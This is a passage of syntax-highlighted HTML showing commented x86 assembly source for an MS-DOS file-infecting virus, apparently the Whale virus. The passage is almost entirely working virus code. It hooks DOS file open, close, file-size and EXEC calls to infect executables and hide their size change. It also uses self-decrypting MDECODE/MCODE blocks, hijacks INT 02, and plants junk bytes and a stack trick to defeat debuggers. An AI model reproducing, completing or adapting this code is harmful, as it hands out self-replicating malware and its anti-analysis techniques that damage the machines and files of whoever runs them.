                                        </span><span class="sc1">; SI = 2234 / 4A44</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">02E3h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================( Handler fÅr GET FILESIZE /FCB )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J030DF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@FCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0025h</span><span class="sc0">                     </span><span class="sc1">; Kopiere FCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">
   
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                       </span><span class="sc1">; OPEN FCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@FCB</span><span class="sc0">               </span><span class="sc1">; FCB steht an DS:DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                       </span><span class="sc1">; CLOSE FCB !</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@FCB</span><span class="sc4">+</span><span class="sc2">17H</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">30</span><span class="sc0">

                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03182</span><span class="sc0">

                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@FCB</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; File-Size</span><span class="sc0">

</span><span class="sc5">J03117</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@FCB</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Rec-Size</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">23h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">21h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">31</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================================( setzt INT 02 auf "IRET" )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">StopINT_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; setze Bit 2</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">               </span><span class="sc1">; GET INT 02</span><span class="sc0">
                                                </span><span class="sc1">; ergebnis in ES:BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                   </span><span class="sc1">; AX = CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03179</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT02</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT02</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03170</span><span class="sc0">
</span><span class="sc5">J03170</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; GET IP</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_02</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03170</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">               </span><span class="sc1">; SET INT 02 auf IRET</span><span class="sc0">

</span><span class="sc5">J03179</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">32</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">INT_02</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IRET</span><span class="sc0">    </span><span class="sc1">; KOPROZESSORFEHLER + MEMORY PARITY-FEHLER</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03182</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">          </span><span class="sc1">; CALL LOW_INT_21</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================================( SET INT 02 zum Original )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Re_SET_Int_02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">             </span><span class="sc1">; lîsche Bit 2</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT02</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; OLD INT 02</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">          </span><span class="sc1">; SET INT 02</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">33</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================( Handler fÅr Open File / Handle )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J031A6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_Current_PSP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J039C3</span><span class="sc0">          </span><span class="sc1">; ist die Datei ausfÅhrbar ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J031F1</span><span class="sc0">          </span><span class="sc1">; nein....</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24A2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; hab ich schon infiziert</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J031F1</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J043B1</span><span class="sc0">          </span><span class="sc1">; Vorarbeiten</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; Fehler bei Vorarbeiten ??</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J031F1</span><span class="sc0">          </span><span class="sc1">; oder garkeine DATEI ??</span><span class="sc0">
</span><span class="sc1">;===========================================()==========================</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24A2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0014h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D2452</span><span class="sc0"> </span><span class="sc1">; ja ? wenn ich's wÅsst...</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">34</span><span class="sc0">

</span><span class="sc5">J031E7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">        </span><span class="sc1">; CF lîschen</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">

</span><span class="sc5">J031F1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">  </span><span class="sc1">; CALL LOW_INT_21</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================( Handler fÅr CLOSE FILE / Handle )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J031F4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">35</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_Current_PSP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0014h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D2452</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">35</span><span class="sc0">

</span><span class="sc5">J0320C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">
</span><span class="sc5">J0320E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03227</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0320C</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03642</span><span class="sc0">                  </span><span class="sc1">; infizieren !</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24A2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J031E7</span><span class="sc0">
        </span><span class="sc1">;================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">
        </span><span class="sc1">;================================</span><span class="sc0">
</span><span class="sc5">J03227</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">          </span><span class="sc1">; Call LOW-INT-21</span><span class="sc0">
        </span><span class="sc1">;================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3DH</span><span class="sc0">
        </span><span class="sc1">;================================</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( Hole aktuelle DTA )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GetDTA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2FH</span><span class="sc0">          </span><span class="sc1">; GET DTA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">36</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03240</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">012H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc0">  </span><span class="sc1">; JMP     J03555  == NIRWANA !</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( versteckter DECODE-Aufruf )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Decode</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0491B</span><span class="sc0">          </span><span class="sc1">; CMP     AX,16D5H</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------(trash)---</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03240</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">12EFh</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> 
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">J02FEA</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====(-----------------------------------------------------------)===</span><span class="sc0">
</span><span class="sc1">;=====(                   Affengeiler Code                        )===</span><span class="sc0">
</span><span class="sc1">;=====(-----------------------------------------------------------)===</span><span class="sc0">
</span><span class="sc1">;=====( SP sichern in BP                                          )===</span><span class="sc0">
</span><span class="sc1">;=====( "C353" auf den Stack, wobei SS=CS &amp; C353 = "PUSH BX, RET" )===</span><span class="sc0">
</span><span class="sc1">;=====( Dann ein CALL dessen RET-Adresse vom Stack geholt wird.   )===</span><span class="sc0">
</span><span class="sc1">;=====( DafÅr wird DX alias BP auf den Stack gelegt. Kuckuck !    )===</span><span class="sc0">
</span><span class="sc1">;=====( Schliesslich wird nach SS:SP-2, also "PUSH BX, RET",      )===</span><span class="sc0">
</span><span class="sc1">;=====( gesprungen, also ein "RET" zur Adresse J034D4 ausgefÅhrt  )===</span><span class="sc0">
</span><span class="sc1">;=====(-----------------------------------------------------------)===</span><span class="sc0">
</span><span class="sc1">;=====( Kein Wunder, da· der Wal nach Fischen sucht ;-)))         )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03251</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                   </span><span class="sc1">; DX = BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0C353H</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J03259</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0341A</span><span class="sc0">                  </span><span class="sc1">; ursprÅnglich "INT 3"</span><span class="sc0">
</span><span class="sc5">J0325C</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BBH</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------( Info )---</span><span class="sc0">
</span><span class="sc1">;       J0341A: POP     BX                              ; BX = 325C</span><span class="sc0">
</span><span class="sc1">;               ADD     BX,OFFSET J034D4-Offset J0325C</span><span class="sc0">
</span><span class="sc1">;               PUSH    DX                      ;</span><span class="sc0">
</span><span class="sc1">;               SUB     BP,+02h                 ; BP = SP-2</span><span class="sc0">
</span><span class="sc1">;               DB      36H                     ; hat noch gefehlt :-)</span><span class="sc0">
</span><span class="sc1">;               JMP     BP                      ; = JMP  DX / JMP 34D4</span><span class="sc0">
</span><span class="sc1">;--------------------------( =&gt; )------</span><span class="sc0">
</span><span class="sc1">;     SS:SP-2   PUSH   BX       ; = 53h</span><span class="sc0">
</span><span class="sc1">;     SS:SP-1   RET             ; = C3h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================================( Handler fÅr EXEC )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0325D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">   </span><span class="sc1">; Ist AL = 0 ( = Load + execute ) ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03264</span><span class="sc0">  </span><span class="sc1">; JA !!</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J034FC</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( EXEC AX = 4B00 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03264</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">37</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">; Adress of EPB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc4">]</span><span class="sc0">

